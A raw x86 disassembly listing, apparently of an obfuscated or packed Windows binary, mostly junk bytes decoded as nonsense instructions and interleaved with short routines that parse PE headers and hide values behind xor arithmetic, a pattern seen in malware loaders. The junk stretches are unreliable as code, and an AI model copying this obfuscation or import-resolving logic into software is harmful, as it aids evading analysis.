  408d40:	fmul   DWORD PTR [eax+edi*8]
  408d43:	and    eax,0x26844964
  408d48:	and    eax,0x1a5f600d
  408d4d:	mov    ebp,0xdcffc794
  408d52:	enter  0x33ab,0xbd
  408d56:	ficom  DWORD PTR [eax+0x14]
  408d59:	mov    dh,0x49
  408d5b:	mov    ecx,esi
  408d5d:	push   eax
  408d5e:	sub    edi,ecx
  408d60:	xchg   ebp,eax
  408d61:	mov    ah,0x10
  408d63:	maskmovq mm1,(bad)
  408d64:	test   DWORD PTR [ebx+0x5a4fa2f0],0xb6e0db34
  408d6e:	aas    
  408d6f:	dec    eax
  408d70:	test   esp,esi
  408d72:	sub    eax,DWORD PTR [edx-0x6b]
  408d75:	fldcw  WORD PTR [ecx-0x12]
  408d78:	jb     0x408d1f
  408d7a:	repz data16 sub al,0xc6
  408d7e:	xchg   esi,eax
  408d7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d80:	(bad)  
  408d81:	imul   cl
  408d83:	jmp    0xe4f6e7a6
  408d88:	mov    al,0xa3
  408d8a:	cmp    al,0xa2
  408d8c:	repnz icebp 
  408d8e:	repnz xchg ebp,eax
  408d90:	shl    BYTE PTR [ebp+0x62],cl
  408d93:	js     0x408d5e
  408d95:	jmp    0xb632:0x5c36d138
  408d9c:	mov    ah,0xdd
  408d9e:	sbb    DWORD PTR [ebp+0x27],edi
  408da1:	inc    eax
  408da2:	push   esi
  408da3:	sub    DWORD PTR [ecx-0x6c827f92],ecx
  408da9:	push   ebp
  408daa:	sub    al,0x2f
  408dac:	imul   esp,DWORD PTR [esi+0x6f],0x37
  408db0:	mov    dh,0x1a
  408db2:	(bad)  
  408db4:	inc    ecx
  408db5:	ins    BYTE PTR es:[edi],dx
  408db6:	fild   WORD PTR [eax+0x7d]
  408db9:	sub    ah,BYTE PTR ds:0xfc6b782b
  408dbf:	sbb    ecx,edx
  408dc1:	add    eax,0x4488d720
  408dc6:	repz mov ecx,0xe1ef8404
  408dcc:	pusha  
  408dcd:	cld    
  408dce:	push   ebp
  408dcf:	into   
  408dd0:	sahf   
  408dd1:	stos   BYTE PTR es:[edi],al
  408dd2:	sbb    eax,0x1e6c50e5
  408dd7:	mov    DWORD PTR [edx-0x75b50593],esp
  408ddd:	mov    BYTE PTR ds:0xf882d3e2,ah
  408de3:	mov    fs,WORD PTR [ecx+esi*1]
  408de6:	jns    0x408dfb
  408de8:	sub    edi,DWORD PTR [ecx+0x2146934a]
  408dee:	loopne 0x408e2e
  408df0:	mov    ebx,0x422a6e59
  408df5:	jns    0x408e5e
  408df7:	std    
  408df8:	das    
  408df9:	test   al,0x74
  408dfb:	out    0x8,eax
  408dfd:	addr16 or al,0xa8
  408e00:	mov    dl,0xd4
  408e02:	sbb    DWORD PTR [ecx],ebx
  408e04:	inc    eax
  408e05:	jl     0x408da6
  408e07:	or     BYTE PTR [edi+0x2],dl
  408e0a:	xchg   ebp,eax
  408e0b:	and    DWORD PTR ds:0x1e7940b2,esp
  408e11:	and    dh,BYTE PTR [ecx+0x59]
  408e14:	sub    al,0x11
  408e16:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e18:	mov    dh,0x8b
  408e1a:	pusha  
  408e1b:	adc    cl,dh
  408e1d:	jecxz  0x408e17
  408e1f:	jl     0x408ddb
  408e21:	dec    esp
  408e22:	sahf   
  408e23:	adc    dh,bh
  408e25:	jg     0x408e8d
  408e27:	mov    eax,DWORD PTR [ebp-0x4]
  408e2a:	movzx  eax,ax
  408e2d:	sub    ecx,edi
  408e2f:	cmp    eax,ecx
  408e31:	mov    eax,DWORD PTR [ebp+0x10]
  408e34:	movzx  ecx,WORD PTR [ebp-0x4]
  408e38:	jg     0x408e4d
  408e3e:	xor    eax,esi
  408e40:	sub    ecx,eax
  408e42:	sub    ecx,edi
  408e44:	mov    WORD PTR [ebp-0x4],cx
  408e48:	jmp    0x408e5a
  408e4d:	xor    eax,esi
  408e4f:	lea    eax,[eax+ecx*1+0x32729b]
  408e56:	mov    WORD PTR [ebp-0x4],ax
  408e5a:	mov    eax,DWORD PTR [ebp-0xc]
  408e5d:	cmp    eax,ebx
  408e5f:	je     0x408e73
  408e65:	mov    eax,DWORD PTR [ebp-0x8]
  408e68:	mov    DWORD PTR [eax],0x60341e89
  408e6e:	jmp    0x409836
  408e73:	mov    eax,DWORD PTR [ebp+0x8]
  408e76:	mov    ecx,DWORD PTR [ebp-0x8]
  408e79:	xor    eax,esi
  408e7b:	add    eax,edi
  408e7d:	cmp    DWORD PTR [ecx],eax
  408e7f:	je     0x409149
  408e85:	mov    ecx,DWORD PTR [ebp-0x14]
  408e88:	mov    eax,DWORD PTR [ebp-0x8]
  408e8b:	mov    eax,DWORD PTR [eax]
  408e8d:	mov    eax,DWORD PTR [eax+0x3c]
  408e90:	lea    ecx,[ecx*8+0x78]
  408e97:	add    eax,ecx
  408e99:	mov    ecx,DWORD PTR [ebp-0x8]
  408e9c:	mov    ecx,DWORD PTR [ecx]
  408e9e:	mov    eax,DWORD PTR [eax+ecx*1]
  408ea1:	mov    DWORD PTR [ebp-0x1c],eax
  408ea4:	mov    eax,DWORD PTR [ebp+0x8]
  408ea7:	jmp    0x4090ee
  408eac:	sbb    al,0x56
  408eae:	aam    0xcf
  408eb0:	je     0x408eff
  408eb2:	and    eax,0xfc4f2b75
  408eb7:	adc    eax,0x7fdbf1fa
  408ebc:	or     al,0xd1
  408ebe:	jle    0x408f3e
  408ec0:	and    al,0x7c
  408ec2:	jle    0x408f42
  408ec4:	sub    al,0xd5
  408ec6:	cmc    
  408ec7:	xchg   esi,eax
  408ec8:	sti    
  408ec9:	push   esp
  408eca:	jmp    0xe436:0xc8eabbd
  408ed1:	xor    ch,ch
  408ed3:	pop    ds
  408ed4:	cmp    cl,al
  408ed6:	int3   
  408ed7:	fisttp QWORD PTR [ebp+0x19]
  408eda:	sti    
  408edb:	call   0xd625:0x580299ec
  408ee2:	pop    si
  408ee4:	sub    al,0xd3
  408ee6:	daa    
  408ee7:	push   0x985b7434
  408eec:	pop    ecx
  408eed:	dec    ebx
  408eee:	call   0x1219:0x3d55393b
  408ef5:	dec    esp
  408ef6:	cmp    eax,DWORD PTR [ebx+0x502165a4]
  408efc:	ins    BYTE PTR es:[edi],dx
  408efd:	neg    ebx
  408eff:	stos   DWORD PTR es:[edi],eax
  408f00:	inc    esi
  408f01:	pop    edx
  408f02:	pop    edx
  408f03:	or     ch,BYTE PTR [ebx+edi*4-0x448e0345]
  408f0a:	stc    
  408f0b:	outs   dx,BYTE PTR ds:[esi]
  408f0c:	or     eax,0x73af3bf4
  408f11:	scas   al,BYTE PTR es:[edi]
  408f12:	jl     0x408f25
  408f14:	xlat   BYTE PTR ds:[ebx]
  408f15:	loop   0x408f6e
  408f17:	in     al,0x9f
  408f19:	out    0x10,al
  408f1b:	in     al,dx
  408f1c:	retf   
  408f1d:	dec    ecx
  408f1e:	xchg   ebx,eax
  408f1f:	cdq    
  408f20:	lea    esi,[edi+edi*4]
  408f23:	inc    ebx
  408f24:	sar    edi,1
  408f26:	add    ecx,DWORD PTR [ebx]
  408f28:	push   0xfff51557
  408f2d:	aad    0x25
  408f2f:	and    al,0x54
  408f31:	(bad)  
  408f32:	mov    ds:0x2b18c1ca,al
  408f37:	enter  0xaa6c,0x4b
  408f3b:	xchg   ch,bh
  408f3d:	mov    eax,0x68c0c411
  408f42:	jle    0x408ef9
  408f44:	add    dl,BYTE PTR [edx]
  408f46:	push   edx
  408f47:	adc    edx,DWORD PTR [esi+0x39562bd0]
  408f4d:	mov    ds:0x1293cb9c,eax
  408f52:	jmp    0x755fd1c0
  408f57:	and    BYTE PTR [esi-0x20],0x38
  408f5b:	js     0x408f12
  408f5d:	sbb    eax,0x4c5507ed
  408f62:	ins    BYTE PTR es:[edi],dx
  408f63:	inc    ecx
  408f64:	jmp    0x5acd7412
  408f69:	push   ds
  408f6a:	ss pop edx
  408f6c:	cmp    BYTE PTR [ecx],dl
  408f6e:	test   eax,0xf46dd492
  408f73:	jg     0x408f5f
  408f75:	retf   
  408f76:	adc    BYTE PTR [edi-0x4bd9c58c],bl
  408f7c:	pop    ebx
  408f7d:	ficom  DWORD PTR [ecx-0x59]
  408f80:	stos   BYTE PTR es:[edi],al
  408f81:	rol    ch,0xdf
  408f84:	sub    al,0x81
  408f86:	xchg   ecx,eax
  408f87:	xor    dl,cl
  408f89:	or     edx,edx
  408f8b:	xchg   esi,eax
  408f8c:	push   es
  408f8d:	int    0x24
  408f8f:	fs test al,0x3
  408f92:	add    BYTE PTR [edi+0x6544acb9],0xc9
  408f99:	sub    eax,0xd5dff4f3
  408f9e:	xor    cl,BYTE PTR [edx]
  408fa0:	jmp    0x408fbc
  408fa2:	aas    
  408fa3:	into   
  408fa4:	outs   dx,DWORD PTR ds:[esi]
  408fa5:	in     eax,0xc6
  408fa7:	stos   BYTE PTR es:[edi],al
  408fa8:	mov    dl,0x9
  408faa:	adc    al,BYTE PTR [edi-0xb1b6d43]
  408fb0:	lea    edx,ds:0x7b3b27b6
  408fb6:	int3   
  408fb7:	jp     0x408fdc
  408fb9:	adc    edx,DWORD PTR [edx]
  408fbb:	adc    BYTE PTR [eax+0x28d8a9d3],bl
  408fc1:	dec    ebp
  408fc2:	dec    edx
  408fc3:	lock int3 
  408fc5:	stc    
  408fc6:	push   0xe5b0828e
  408fcb:	mov    esi,0xf00f72f5
  408fd0:	adc    BYTE PTR [ecx+0x1e980a2b],dl
  408fd6:	pop    edx
  408fd7:	adc    DWORD PTR [ecx-0x1faedc2d],esp
  408fdd:	xor    ecx,0x3d
  408fe0:	fiadd  WORD PTR [edx+0x3d071d20]
  408fe6:	sahf   
  408fe7:	or     ch,BYTE PTR [ebx-0x1]
  408fea:	and    edi,ecx
  408fec:	call   0x2a42c44f
  408ff1:	push   esi
  408ff2:	sbb    DWORD PTR [ebp+0x73bf9d0c],ecx
  408ff8:	and    ah,BYTE PTR [edi]
  408ffa:	ret    0xf71f
  408ffd:	mov    ch,0x78
  408fff:	es stos DWORD PTR es:[edi],eax
  409001:	cwde   
  409002:	adc    eax,0xa802d590
  409007:	mov    cl,0x8
  409009:	adc    DWORD PTR [ebp+0x3a],esi
  40900c:	mov    dh,0xa6
  40900e:	(bad)  
  40900f:	rcl    BYTE PTR [edx+0x1e],1
  409012:	mov    ah,0x1b
  409014:	in     eax,dx
  409015:	lea    ebx,[esi]
  409017:	sub    al,0x58
  409019:	push   0x61ea5401
  40901e:	popa   
  40901f:	jno    0x408fda
  409021:	add    bl,ch
  409023:	dec    eax
  409024:	sub    DWORD PTR [edx+esi*1],edx
  409027:	jns    0x409073
  409029:	push   cs
  40902a:	and    DWORD PTR [eax+edx*2],0x48
  40902e:	cmp    DWORD PTR [edx+edi*8-0xf49bccd],ebx
  409035:	outs   dx,BYTE PTR ds:[esi]
  409036:	push   ecx
  409037:	cs arpl si,si
  40903a:	rol    ah,1
  40903c:	push   esp
  40903d:	xchg   esi,eax
  40903e:	fs push esi
  409040:	(bad)  
  409041:	pushf  
  409042:	push   0x208127b8
  409047:	ja     0x40902a
  409049:	ja     0x409083
  40904b:	cdq    
  40904c:	adc    al,0xe
  40904e:	arpl   bp,sp
  409050:	dec    esp
  409051:	push   0x6cd23f7a
  409056:	mov    esp,0x38279c33
  40905b:	loope  0x4090da
  40905d:	arpl   WORD PTR [ecx+0x2c],ax
  409060:	push   edi
  409061:	rol    BYTE PTR [ecx],cl
  409063:	popa   
  409064:	(bad)  
  409065:	lea    edi,[ebx+0x414de9f4]
  40906b:	loopne 0x40907f
  40906d:	out    0xf8,al
  40906f:	pop    ebx
  409070:	and    ebx,DWORD PTR [edx]
  409072:	xchg   ecx,eax
  409073:	shr    edx,cl
  409075:	es xchg edx,esp
  409078:	es popf 
  40907a:	xchg   ebx,eax
  40907b:	(bad)
  40907e:	adc    ebx,ebp
  409080:	(bad)  
  409081:	and    BYTE PTR [ebp+0x40c2a9a9],0x9e
  409088:	fwait
  409089:	rol    BYTE PTR [eax+0x2ec3e8b1],cl
  40908f:	fnstcw WORD PTR [edi+0x71]
  409092:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409093:	push   esi
  409094:	xor    BYTE PTR [eiz*8-0x430db1f],0x6e
  40909c:	cwde   
  40909d:	adc    eax,0xb230af82
  4090a2:	scas   al,BYTE PTR es:[edi]
  4090a3:	outs   dx,DWORD PTR ds:[esi]
  4090a4:	retf   
  4090a5:	mov    bh,0xfd
  4090a7:	add    DWORD PTR [ecx+0x38fb3b3d],ebx
  4090ad:	fild   QWORD PTR [edi+0x5fbeb736]
  4090b3:	mov    ax,cs:0x2306c037
  4090ba:	out    dx,eax
  4090bb:	inc    edx
  4090bc:	mov    edi,0x6dd8d025
  4090c1:	push   ecx
  4090c2:	cld    
  4090c3:	test   cl,dh
  4090c5:	cmp    al,BYTE PTR [edx-0x7a]
  4090c8:	jle    0x409061
  4090ca:	jo     0x4090ef
  4090cc:	daa    
  4090cd:	imul   edi,DWORD PTR [ebx],0x51c1d54
  4090d3:	call   0xe805:0x231e168a
  4090da:	mov    bl,0xd5
  4090dc:	inc    ebx
  4090dd:	test   BYTE PTR [edi+0x1e],bh
  4090e0:	shl    DWORD PTR [ebx-0x740d1106],1
  4090e6:	or     bh,0xe6
  4090e9:	xchg   esp,eax
  4090ea:	sahf   
  4090eb:	and    bh,BYTE PTR [esi-0x9]
  4090ee:	xor    eax,esi
  4090f0:	add    eax,edi
  4090f2:	mov    DWORD PTR [ebp-0x20],eax
  4090f5:	mov    eax,DWORD PTR [ebp+0x8]
  4090f8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4090fb:	xor    eax,esi
  4090fd:	add    eax,edi
  4090ff:	cmp    ecx,eax
  409101:	je     0x409836
  409107:	mov    eax,DWORD PTR [ebp-0x8]
  40910a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40910d:	add    ecx,DWORD PTR [eax]
  40910f:	mov    DWORD PTR [ebp-0x20],ecx
  409112:	mov    eax,DWORD PTR [ebp-0x20]
  409115:	mov    ecx,DWORD PTR [ebp-0x8]
  409118:	mov    eax,DWORD PTR [eax+0xc]
  40911b:	mov    ecx,DWORD PTR [ecx]
  40911d:	mov    al,BYTE PTR [eax+ecx*1]
  409120:	add    al,0x38
  409122:	xor    al,0x46
  409124:	cmp    al,0xc5
  409126:	je     0x40913d
  40912c:	mov    eax,DWORD PTR [ebp+0x8]
  40912f:	mov    ecx,DWORD PTR [ebp-0x8]
  409132:	xor    eax,esi
  409134:	add    eax,edi
  409136:	mov    DWORD PTR [ecx],eax
  409138:	jmp    0x409836
  40913d:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  409144:	jmp    0x409836
  409149:	mov    eax,DWORD PTR [ebp-0x8]
  40914c:	mov    ecx,DWORD PTR [ebp-0x18]
  40914f:	mov    ecx,DWORD PTR [ecx]
  409151:	jmp    0x409398
  409156:	sbb    eax,0xe1aec100
  40915b:	outs   dx,DWORD PTR ds:[esi]
  40915c:	jno    0x4090ef
  40915e:	out    dx,al
  40915f:	jne    0x4090f6
  409161:	mov    bh,0x36
  409163:	out    0x72,al
  409165:	mov    ch,0x32
  409167:	fistp  QWORD PTR [esi+0x7e]
  40916a:	and    al,0x7c
  40916c:	jle    0x4091ec
  40916e:	mov    ah,0x7c
  409170:	push   ds
  409171:	mov    BYTE PTR [eax],dh
  409173:	push   ss
  409174:	cs push es
  409176:	xchg   edi,eax
  409177:	dec    esp
  409178:	xchg   DWORD PTR [eax-0x64],ecx
  40917b:	mov    ah,BYTE PTR [edi-0x476e75a6]
  409181:	fsubr  QWORD PTR [eax+0x794029eb]
  409187:	and    ecx,esi
  409189:	call   0xaa8b:0x76a4c22b
  409190:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409191:	outs   dx,BYTE PTR ds:[esi]
  409192:	cs dec esi
  409194:	(bad)  
  409195:	push   eax
  409196:	push   ebx
  409197:	les    edx,FWORD PTR ds:0x43c265f2
  40919d:	mov    dl,0x16
  40919f:	in     al,dx
  4091a0:	and    ecx,edx
  4091a2:	jmp    0xa1fb:0x9476aa11
  4091a9:	xor    dh,BYTE PTR [edx+ecx*8+0x79]
  4091ad:	hlt    
  4091ae:	inc    esi
  4091af:	or     cl,al
  4091b1:	(bad)  
  4091b2:	not    DWORD PTR [eax+0xa]
  4091b5:	lahf   
  4091b6:	iret   
  4091b7:	or     BYTE PTR [edi-0xe3b8d3a],al
  4091bd:	pushf  
  4091be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4091bf:	push   ebp
  4091c0:	or     ebx,ebx
  4091c2:	xor    al,0xc5
  4091c4:	loop   0x409184
  4091c6:	ins    BYTE PTR es:[edi],dx
  4091c7:	cmp    al,0xbd
  4091c9:	cli    
  4091ca:	and    BYTE PTR [ebp+0x65c2eaed],bh
  4091d0:	dec    ebx
  4091d1:	pop    eax
  4091d2:	sub    al,0x8c
  4091d4:	gs pop es
  4091d6:	loop   0x4091c4
  4091d8:	jge    0x4091a3
  4091da:	jo     0x40922d
  4091dc:	leave  
  4091dd:	shl    ebp,0x93
  4091e0:	mov    ds:0x886a05e5,eax
  4091e5:	push   esi
  4091e6:	push   0x3fbf27fe
  4091eb:	rcl    al,0xc9
  4091ee:	aad    0x42
  4091f0:	jg     0x409207
  4091f2:	add    ebx,ebx
  4091f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091f5:	sbb    ebx,edi
  4091f7:	int3   
  4091f8:	idiv   DWORD PTR [esi+0x29]
  4091fb:	mov    bh,0x2f
  4091fd:	xor    dh,BYTE PTR [ebx+0x3949cf77]
  409203:	mov    dl,0xfc
  409205:	jl     0x4091bc
  409207:	fwait
  409208:	sar    BYTE PTR [esi],cl
  40920a:	and    al,0xfc
  40920c:	or     DWORD PTR [esi+0x22],ebx
  40920f:	mov    BYTE PTR [edx],dh
  409211:	in     eax,dx
  409212:	repnz mov bl,0x24
  409215:	sub    edx,DWORD PTR [edi-0x1f]
  409218:	leave  
  409219:	scas   al,BYTE PTR es:[edi]
  40921a:	arpl   WORD PTR [edi+0x6218593a],sp
  409220:	cmc    
  409221:	shr    BYTE PTR [esi],0x22
  409224:	add    DWORD PTR [esi+0x2ab8bf3a],ecx
  40922a:	add    eax,0xdca05df4
  40922f:	not    DWORD PTR [esi+edx*4]
  409232:	add    DWORD PTR [ebx],eax
  409234:	dec    ebx
  409235:	stc    
  409236:	pop    edi
  409237:	cmp    DWORD PTR [eax+0xfdcbf27],edx
  40923d:	call   0x8b90b3ac
  409242:	or     al,0x77
  409244:	mov    esi,0x1ecd8c8a
  409249:	pop    eax
  40924a:	mov    al,0x7f
  40924c:	in     eax,0xfc
  40924e:	pusha  
  40924f:	inc    ebp
  409250:	sub    ah,bl
  409252:	cli    
  409253:	or     al,0x7d
  409255:	les    edi,FWORD PTR [ecx+0x4519b172]
  40925b:	add    al,0xdb
  40925d:	mov    ah,0x3d
  40925f:	mov    ch,0xf3
  409261:	or     BYTE PTR [ecx+0x12fbddf9],al
  409267:	pop    ecx
  409268:	into   
  409269:	sub    cl,BYTE PTR [edx+0x4badbdc5]
  40926f:	jle    0x40927c
  409271:	add    DWORD PTR [esi-0x18],eax
  409274:	sub    eax,0x91a13ca
  409279:	ds inc ebp
  40927b:	in     al,0xe7
  40927d:	jb     0x4092a0
  40927f:	xchg   edx,eax
  409280:	dec    esp
  409281:	pop    edx
  409282:	adc    al,0x8a
  409284:	mov    esi,0x448b33e1
  409289:	rcr    BYTE PTR [edx],1
  40928b:	stos   DWORD PTR es:[edi],eax
  40928c:	mov    ah,0xbe
  40928e:	adc    eax,0xf67d0c01
  409293:	in     al,0x79
  409295:	clc    
  409296:	leave  
  409297:	mov    ebp,0xf8e3f51f
  40929c:	fcomp  DWORD PTR [ecx-0x170e477a]
  4092a2:	outs   dx,DWORD PTR ds:[esi]
  4092a3:	outs   dx,BYTE PTR ds:[esi]
  4092a4:	hlt    
  4092a5:	dec    esp
  4092a6:	jge    0x409299
  4092a8:	in     eax,0x39
  4092aa:	inc    eax
  4092ab:	(bad)
  4092af:	out    0x3,eax
  4092b1:	pop    ecx
  4092b2:	jge    0x409268
  4092b4:	sbb    eax,DWORD PTR [ebx-0x7fc51030]
  4092ba:	sbb    edi,DWORD PTR [ebp+0x17077a28]
  4092c0:	mov    dl,0xa
  4092c2:	je     0x40925e
  4092c4:	sub    BYTE PTR [edx+edi*1],0x13
  4092c8:	sbb    ch,dl
  4092ca:	or     eax,0x4d6f9428
  4092cf:	cmp    eax,ecx
  4092d1:	add    dl,BYTE PTR [eax+ebp*8-0x2326056a]
  4092d8:	mov    eax,ds:0x3de20734
  4092dd:	sub    dl,BYTE PTR [ebx+0x20]
  4092e0:	mov    edi,0x1e4703fe
  4092e5:	outs   dx,DWORD PTR ds:[esi]
  4092e6:	jl     0x4092be
  4092e8:	sbb    eax,0x5174eafe
  4092ed:	jmp    0x6c0526c4
  4092f2:	das    
  4092f3:	push   0xffffffbe
  4092f5:	jmp    0x2f89:0x515dc944
  4092fc:	lods   eax,DWORD PTR ds:[esi]
  4092fd:	mov    ebp,DWORD PTR [edx]
  4092ff:	cli    
  409300:	jb     0x409364
  409302:	inc    esp
  409303:	and    DWORD PTR [edx+edx*2+0x233544a0],ebx
  40930a:	push   es
  40930b:	xchg   esi,eax
  40930c:	call   0x73ef:0xdad2f50e
  409313:	lock in eax,0x45
  409316:	and    DWORD PTR [ecx+0x54],ebp
  409319:	mov    BYTE PTR [ebp-0x29651b55],bh
  40931f:	xor    DWORD PTR ds:0x5f71c0ad,ecx
  409325:	mov    dl,0xf5
  409327:	pusha  
  409328:	push   edi
  409329:	sub    DWORD PTR [edx],esi
  40932b:	pop    edi
  40932c:	lahf   
  40932d:	cmp    al,0xc0
  40932f:	inc    ebx
  409330:	jl     0x4092fa
  409332:	or     BYTE PTR [esp+esi*4+0x26],ah
  409336:	push   ebx
  409337:	mov    ah,0x95
  409339:	xchg   BYTE PTR [edx+0x45],ah
  40933c:	js     0x4092f9
  40933e:	dec    edi
  40933f:	jbe    0x4092e7
  409341:	fbld   TBYTE PTR [ebx]
  409343:	popf   
  409344:	rol    BYTE PTR [eax-0x3c65d7f2],cl
  40934a:	loopne 0x4093a5
  40934c:	dec    eax
  40934d:	rol    ah,1
  40934f:	(bad)  
  409350:	jbe    0x409334
  409352:	(bad)  
  409353:	dec    eax
  409354:	push   esp
  409355:	push   edx
  409356:	in     eax,dx
  409357:	js     0x409326
  409359:	(bad)  
  40935a:	dec    edi
  40935b:	cmp    BYTE PTR [ebx],0x5a
  40935e:	not    DWORD PTR [edx-0x4c]
  409361:	hlt    
  409362:	and    al,0x9c
  409364:	sahf   
  409365:	xchg   ecx,eax
  409366:	add    ecx,DWORD PTR [ebx+0x1baaff47]
  40936c:	dec    esi
  40936d:	jg     0x40933f
  40936f:	xor    edi,DWORD PTR [ecx]
  409371:	jg     0x409384
  409373:	outs   dx,BYTE PTR ds:[esi]
  409374:	add    DWORD PTR [ebx+0x4],edx
  409377:	dec    eax
  409378:	jne    0x409381
  40937a:	cmp    DWORD PTR [edi-0x6c87a879],edx
  409380:	data16 xor BYTE PTR [eax+0x6e2361bf],al
  409387:	jl     0x409316
  409389:	in     al,dx
  40938a:	test   eax,0x5e4786ca
  40938f:	xchg   esi,eax
  409390:	pandn  mm1,mm5
  409393:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409394:	jle    0x4093ba
  409396:	repnz test BYTE PTR [ecx+0xc458b08],cl
  40939d:	mov    eax,DWORD PTR [ebp+0x8]
  4093a0:	push   DWORD PTR [ebp-0x8]
  4093a3:	jmp    0x4095ea
  4093a8:	lods   eax,DWORD PTR ds:[esi]
  4093a9:	mov    dl,0xfe
  4093ab:	outs   dx,BYTE PTR ds:[esi]
  4093ac:	xor    DWORD PTR [edx+0x6d],0x15d7aa71
  4093b3:	pop    edi
  4093b4:	lds    esi,FWORD PTR [edx-0x22274bd4]
  4093ba:	jle    0x40943a
  4093bc:	and    al,0x7c
  4093be:	jle    0x40943e
  4093c0:	fidiv  DWORD PTR [edx+0xa809e5a]
  4093c6:	dec    ebp
  4093c7:	and    esi,edi
  4093c9:	iret   
  4093ca:	mov    bl,0xed
  4093cc:	xchg   ebp,eax
  4093cd:	inc    esp
  4093ce:	or     eax,0xbe892da7
  4093d3:	add    ecx,esp
  4093d5:	sub    cl,BYTE PTR [ebx]
  4093d7:	mov    ebp,0x5ff6a8f4
  4093dc:	nop
  4093dd:	pop    ebp
  4093de:	mov    WORD PTR [ecx-0x1d],ds
  4093e1:	xor    DWORD PTR [eax+ebp*2],eax
  4093e4:	mov    esp,0x7329fdc1
  4093e9:	cmc    
  4093ea:	or     cl,cl
  4093ec:	in     al,0xa5
  4093ee:	lds    ebp,FWORD PTR [ebx+0x7066beae]
  4093f4:	in     al,0xca
  4093f6:	push   ebx
  4093f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093f8:	stos   DWORD PTR es:[edi],eax
  4093f9:	shl    DWORD PTR [ecx+0x3f],0x3d
  4093fd:	in     eax,dx
  4093fe:	shr    esp,cl
  409400:	cdq    
  409401:	cmp    ah,BYTE PTR [edi+0x19]
  409404:	retf   
  409405:	stos   BYTE PTR es:[edi],al
  409406:	cdq    
  409407:	sub    eax,0x91dbaab8
  40940c:	inc    ax
  40940e:	leave  
  40940f:	in     eax,0x30
  409411:	inc    esi
  409412:	and    ah,bl
  409414:	call   0x941c2328
  409419:	and    esi,DWORD PTR [edi-0x7e]
  40941c:	mov    DWORD PTR [edx],esp
  40941e:	fcom   DWORD PTR [ebx]
  409420:	mov    dl,BYTE PTR [esp+edx*1]
  409423:	(bad)  
  409424:	cmc    
  409425:	xchg   DWORD PTR [ecx+0x7d],ebp
  409428:	inc    edi
  409429:	retf   0x61ec
  40942c:	mov    al,ds:0x96754f83
  409431:	popa   
  409432:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409433:	xor    ah,al
  409435:	sub    esi,eax
  409437:	xchg   esi,eax
  409438:	je     0x409447
  40943a:	mov    ah,0x14
  40943c:	cmp    al,0xee
  40943e:	sahf   
  40943f:	ins    DWORD PTR es:[edi],dx
  409440:	and    dl,BYTE PTR [ebp-0x3f56b078]
  409446:	sub    ch,cl
  409448:	or     ch,BYTE PTR [edi+0x22d46bb0]
  40944e:	xadd   DWORD PTR [ecx],esi
  409451:	push   ebp
  409452:	out    0xe2,al
  409454:	ins    DWORD PTR es:[edi],dx
  409455:	cs call 0x2a4c:0xf92b14f9
  40945d:	repz dec ebx
  40945f:	sar    dl,cl
  409461:	repnz stc 
  409463:	fwait
  409464:	addr16 mov cl,0x90
  409467:	pushf  
  409468:	mov    ds:0x11af9112,al
  40946d:	sahf   
  40946e:	jb     0x409493
  409470:	(bad)  
  409471:	addr16 push ebx
  409473:	mov    eax,ds:0xd33a6db3
  409478:	out    0x52,al
  40947a:	js     0x4093fd
  40947c:	mov    ds:0x33260c64,al
  409481:	jae    0x4094b0
  409483:	add    esi,0xe31ddf9
  409489:	popf   
  40948a:	mov    ebx,0x174f94fd
  40948f:	mov    ?,WORD PTR [edx]
  409491:	dec    edi
  409492:	out    dx,al
  409493:	int    0x1
  409495:	cli    
  409496:	pop    es
  409497:	in     al,dx
  409498:	nop
  409499:	lea    edi,[eax-0x6f]
  40949c:	inc    ebp
  40949d:	sub    ch,BYTE PTR [ebp-0x68]
  4094a0:	jns    0x409473
  4094a2:	cmp    al,BYTE PTR [ebp+0x3606d4e0]
  4094a8:	pop    ebp
  4094a9:	cwde   
  4094aa:	inc    ebp
  4094ab:	or     al,0xb5
  4094ad:	cmp    eax,0xafa54b92
  4094b2:	stos   DWORD PTR es:[edi],eax
  4094b3:	cwde   
  4094b4:	ss jmp 0x56b5:0xb2a58ae8
  4094bc:	mov    edx,0xdbd20e2d
  4094c1:	xchg   ebx,eax
  4094c2:	xor    DWORD PTR [edx],0xcbfc23a2
  4094c8:	sub    al,0xcc
  4094ca:	dec    esi
  4094cb:	dec    esi
  4094cc:	in     eax,dx
  4094cd:	mov    al,ds:0xc3b3fa78
  4094d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4094d3:	in     eax,dx
  4094d4:	pop    edx
  4094d5:	or     BYTE PTR [ebp-0x74ebcb51],ah
  4094db:	ja     0x409539
  4094dd:	push   ss
  4094de:	nop
  4094df:	adc    DWORD PTR [edx+0x16064b19],0x16
  4094e6:	js     0x409499
  4094e8:	sahf   
  4094e9:	int3   
  4094ea:	xchg   ebp,eax
  4094eb:	das    
  4094ec:	mov    ebx,0x9252194c
  4094f1:	xchg   esp,eax
  4094f2:	fild   WORD PTR [edx]
  4094f4:	mov    bh,0xcc
  4094f6:	inc    ebx
  4094f7:	inc    esp
  4094f8:	dec    eax
  4094f9:	dec    edi
  4094fa:	ins    DWORD PTR es:[edi],dx
  4094fb:	(bad)  
  4094fc:	outs   dx,BYTE PTR ds:[esi]
  4094fd:	retf   
  4094fe:	in     eax,0x80
  409500:	dec    BYTE PTR [ebp+0x4]
  409503:	ror    DWORD PTR [edx-0x51977ac6],cl
  409509:	pushf  
  40950a:	jmp    0xdb5aee59
  40950f:	add    BYTE PTR [ebx+0x1e],ah
  409512:	cli    
  409513:	retf   0xf97d
  409516:	inc    esp
  409517:	test   DWORD PTR [ebx+0x63074f3d],edx
  40951d:	bound  esi,QWORD PTR [ecx+0x1d]
  409520:	dec    edx
  409521:	jecxz  0x409591
  409523:	mov    cl,0xb2
  409525:	fucomi st,st(3)
  409527:	cmp    cl,BYTE PTR [esi-0x24]
  40952a:	in     eax,dx
  40952b:	ja     0x409531
